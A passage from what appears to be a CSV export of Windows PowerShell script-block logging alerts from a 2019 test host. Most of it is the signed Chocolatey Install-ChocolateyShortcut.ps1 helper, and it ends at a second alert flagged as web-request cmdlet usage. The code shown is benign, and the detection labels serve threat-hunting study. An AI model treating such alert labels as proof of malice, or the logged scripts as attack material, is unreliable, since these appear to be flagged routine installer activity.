oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgM4dhQyywPrPo8jpeR3DNbT7H2WdznBS1+Bus # KT2bfQ0wDQYJKoZIhvcNAQEBBQAEggEAbWUKxJRm84/EF8/zeqa1zKe4AWpJ/gEi # QwtcOXs0Qnyft51e8c1xU2GOQZgAGvgSh7/PxsyVsFf5RMUF4KTVDTiF1PBanepr # vyJHjlmCWoa+NIncrLkelzSZLVmR91IGBpxxuL3E03d1rLOBK3MsTsv/n1l0nTzj # Th0bWNHNjcnJ89/jqS6j0E/x06GXwECdXPke/u6rpZ+ne5huAOlJgmce9bBL1v39 # SLEstdUW37fHTfvf8W4O3vdUYwXayuZOv+5ACQA5wVnwEL/jv+qxNFlM1ciPSuDH # DnFvlJp1vUavbyg9F+n4RYni9EUQTAw9F7Izk3Mt3mS6HCFwSwVWtaGCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NjU5WjAjBgkqhkiG9w0BCQQxFgQUAIvU+JA/yY/VMDda # AF5AyoutdvkwDQYJKoZIhvcNAQEBBQAEggEAAw12+/6F/pa2s2bjPlFgk4ZjQcRt # p/abG6OoDWEMorncdvyhrOe39oQxthDUOLm/FW8JvvlFNHxBwjCy4KUxPRTsmmBf # JKzuGv9Au1dfjGJAS+lPZyxTC5nyeKbCnG3Zwy77dAxvN2ZVd/vRhyw/itKoE3Lv # MSvUKhrRTFB1Sm7if/dh9r5YiBFCgKoTJJ9PCxIrGOx6R3Gbci+StDJXHBDOqgDh # HNoYd6Z6V6AKPy3mzU3yitDuMA2ugksV6OHroWUCUGfVkUCPHJZMceJVXzYTbCUS # wgDjjauYaSo+kzjicD27CjwNSeHZP0MSLFSoHfoU76lF2iplygQ1pdmkMw== # SIG # End signature block","MessageNumber: 1 ¦ MessageTotal: 1 ¦ Path: C:\ProgramData\chocolatey\helpers\functions\Install-ChocolateyShortcut.ps1 ¦ ScriptBlockId: c582daed-1d6e-4b20-9b6b-bca23e84e021 ¦ ScriptBlockText: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Install-ChocolateyShortcut { <# .SYNOPSIS Creates a shortcut .DESCRIPTION This adds a shortcut, at the specified location, with the option to specify a number of additional properties for the shortcut, such as Working Directory, Arguments, Icon Location, and Description. .NOTES If this errors, as it may if being run under the local SYSTEM account with particular folder that SYSTEM doesn't have, it will display a warning instead of failing a package installation. .INPUTS None .OUTPUTS None .PARAMETER ShortcutFilePath The full absolute path to where the shortcut should be created. .PARAMETER TargetPath The full absolute path to the target for new shortcut. .PARAMETER WorkingDirectory OPTIONAL - The full absolute path of the Working Directory that will be used by the new shortcut. As of v0.10.12, the directory will be created unless it contains environment variable expansion like `%AppData%\FooBar`. .PARAMETER Arguments OPTIONAL - Additonal arguments that should be passed along to the new shortcut. .PARAMETER IconLocation OPTIONAL- The full absolute path to an icon file to be used for the new shortcut. .PARAMETER Description OPTIONAL - A text description to be associated with the new description. .PARAMETER WindowStyle OPTIONAL - Type of windows target application should open with. Available in 0.9.10+. 0 = Hidden, 1 = Normal Size, 3 = Maximized, 7 - Minimized. Full list table 3.9 here: https://technet.microsoft.com/en-us/library/ee156605.aspx .PARAMETER RunAsAdmin OPTIONAL - Set ""Run As Administrator"" checkbox for the created the shortcut. Available in 0.9.10+. .PARAMETER PinToTaskbar OPTIONAL - Pin the new shortcut to the taskbar. Available in 0.9.10+. .PARAMETER IgnoredArguments Allows splatting with arguments that do not apply. Do not use directly. .EXAMPLE > # This will create a new shortcut at the location of ""C:\test.lnk"" and # link to the file located at ""C:\text.exe"" Install-ChocolateyShortcut -ShortcutFilePath ""C:\test.lnk"" -TargetPath ""C:\test.exe"" .EXAMPLE > # This will create a new shortcut at the location of ""C:\notepad.lnk"" # and link to the Notepad application. In addition, other properties # are being set to specify the working directory, an icon to be used for # the shortcut, along with a description and arguments. Install-ChocolateyShortcut ` -ShortcutFilePath ""C:\notepad.lnk"" ` -TargetPath ""C:\Windows\System32\notepad.exe"" ` -WorkingDirectory ""C:\"" ` -Arguments ""C:\test.txt"" ` -IconLocation ""C:\test.ico"" ` -Description ""This is the description"" .EXAMPLE > # Creates a new notepad shortcut on the root of c: that starts # notepad.exe as Administrator. Shortcut is also pinned to taskbar. # These parameters are available in 0.9.10+. Install-ChocolateyShortcut ` -ShortcutFilePath ""C:\notepad.lnk"" ` -TargetPath ""C:\Windows\System32\notepad.exe"" ` -WindowStyle 3 ` -RunAsAdmin ` -PinToTaskbar .LINK Install-ChocolateyDesktopLink .LINK Install-ChocolateyExplorerMenuItem .LINK Install-ChocolateyPinnedTaskBarItem #> param( [parameter(Mandatory=$true, Position=0)][string] $shortcutFilePath, [parameter(Mandatory=$true, Position=1)][string] $targetPath, [parameter(Mandatory=$false, Position=2)][string] $workingDirectory, [parameter(Mandatory=$false, Position=3)][string] $arguments, [parameter(Mandatory=$false, Position=4)][string] $iconLocation, [parameter(Mandatory=$false, Position=5)][string] $description, [parameter(Mandatory=$false, Position=6)][int] $windowStyle, [parameter(Mandatory=$false)][switch] $runAsAdmin, [parameter(Mandatory=$false)][switch] $pinToTaskbar, [parameter(ValueFromRemainingArguments = $true)][Object[]]$ignoredArguments ) Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters # http://powershell.com/cs/blogs/tips/archive/2009/02/05/validating-a-url.aspx function isURIWeb($address) { $uri = $address -as [System.URI] $uri.AbsoluteURI -ne $null -and $uri.Scheme -match '[http|https]' } if (!$shortcutFilePath) { # shortcut file path could be null if someone is trying to get special # paths for LocalSystem (SYSTEM). Write-Warning ""Unable to create shortcut. `$shortcutFilePath can not be null."" return } $shortcutDirectory = $([System.IO.Path]::GetDirectoryName($shortcutFilePath)) if (!(Test-Path($shortcutDirectory))) { [System.IO.Directory]::CreateDirectory($shortcutDirectory) | Out-Null } if (!$targetPath) { throw ""Install-ChocolateyShortcut - `$targetPath can not be null."" } if(!(Test-Path($targetPath)) -and !(IsURIWeb($targetPath))) { Write-Warning ""'$targetPath' does not exist. If it is not created the shortcut will not be valid."" } if($iconLocation) { if(!(Test-Path($iconLocation))) { Write-Warning ""'$iconLocation' does not exist. A default icon will be used."" } } if ($workingDirectory) { if ($workingDirectory -notmatch '%\w+%' -and !(Test-Path($workingDirectory))) { [System.IO.Directory]::CreateDirectory($workingDirectory) | Out-Null } } Write-Debug ""Creating Shortcut..."" try { $global:WshShell = New-Object -com ""WScript.Shell"" $lnk = $global:WshShell.CreateShortcut($shortcutFilePath) $lnk.TargetPath = $targetPath $lnk.WorkingDirectory = $workingDirectory $lnk.Arguments = $arguments if($iconLocation) { $lnk.IconLocation = $iconLocation } if ($description) { $lnk.Description = $description } if ($windowStyle) { $lnk.WindowStyle = $windowStyle } $lnk.Save() Write-Debug ""Shortcut created."" [System.IO.FileInfo]$Path = $shortcutFilePath If ($runAsAdmin) { #In order to enable the ""Run as Admin"" checkbox, this code reads the .LNK as a stream # and flips a specific bit while writing a new copy. It then replaces the original # .LNK with the copy, similar to this example: http://poshcode.org/2513 $TempFileName = [IO.Path]::GetRandomFileName() $TempFile = [IO.FileInfo][IO.Path]::Combine($Path.Directory, $TempFileName) $Writer = New-Object System.IO.FileStream $TempFile, ([System.IO.FileMode]::Create) $Reader = $Path.OpenRead() While ($Reader.Position -lt $Reader.Length) { $Byte = $Reader.ReadByte() If ($Reader.Position -eq 22) {$Byte = 34} $Writer.WriteByte($Byte) } $Reader.Close() $Writer.Close() $Path.Delete() Rename-Item -Path $TempFile -NewName $Path.Name | Out-Null } If ($pinToTaskbar) { $scfilename = $Path.FullName $pinverb = (new-object -com ""shell.application"").namespace($(split-path -parent $Path.FullName)).Parsename($(split-path -leaf $Path.FullName)).verbs() | ?{$_.Name -eq 'Pin to Tas&kbar'} If ($pinverb) {$pinverb.doit()} } } catch { Write-Warning ""Unable to create shortcut. Error captured was $($_.Exception.Message)."" } } # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCCV4kKnyvkP8Q6w # z2NjPs2m5xO4ValwoIiDMeri2Kx1gKCCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgM4dhQyywPrPo8jpeR3DNbT7H2WdznBS1+Bus # KT2bfQ0wDQYJKoZIhvcNAQEBBQAEggEAbWUKxJRm84/EF8/zeqa1zKe4AWpJ/gEi # QwtcOXs0Qnyft51e8c1xU2GOQZgAGvgSh7/PxsyVsFf5RMUF4KTVDTiF1PBanepr # vyJHjlmCWoa+NIncrLkelzSZLVmR91IGBpxxuL3E03d1rLOBK3MsTsv/n1l0nTzj # Th0bWNHNjcnJ89/jqS6j0E/x06GXwECdXPke/u6rpZ+ne5huAOlJgmce9bBL1v39 # SLEstdUW37fHTfvf8W4O3vdUYwXayuZOv+5ACQA5wVnwEL/jv+qxNFlM1ciPSuDH # DnFvlJp1vUavbyg9F+n4RYni9EUQTAw9F7Izk3Mt3mS6HCFwSwVWtaGCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NjU5WjAjBgkqhkiG9w0BCQQxFgQUAIvU+JA/yY/VMDda # AF5AyoutdvkwDQYJKoZIhvcNAQEBBQAEggEAAw12+/6F/pa2s2bjPlFgk4ZjQcRt # p/abG6OoDWEMorncdvyhrOe39oQxthDUOLm/FW8JvvlFNHxBwjCy4KUxPRTsmmBf # JKzuGv9Au1dfjGJAS+lPZyxTC5nyeKbCnG3Zwy77dAxvN2ZVd/vRhyw/itKoE3Lv # MSvUKhrRTFB1Sm7if/dh9r5YiBFCgKoTJJ9PCxIrGOx6R3Gbci+StDJXHBDOqgDh # HNoYd6Z6V6AKPy3mzU3yitDuMA2ugksV6OHroWUCUGfVkUCPHJZMceJVXzYTbCUS # wgDjjauYaSo+kzjicD27CjwNSeHZP0MSLFSoHfoU76lF2iplygQ1pdmkMw== # SIG # End signature block","d2c72fb1-8ebf-d5d3-1e88-80f15ba1079a"
"2019-03-19 14:21:27.639 +01:00","Usage Of Web Request Commands And Cmdlets - ScriptBlock","med","MSEDGEWIN10","PwSh",4104,51,"ScriptBlock: # ===================================================================== # Copyright 2017 - Present Chocolatey Software, Inc, and the # original authors/contributors from ChocolateyGallery # Copyright 2011 - 2017 RealDimensions Software, LLC, and the # original authors/contributors from ChocolateyGallery # at https://github.com/chocolatey/chocolatey.org # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. # ===================================================================== # For organizational deployments of Chocolatey, please see 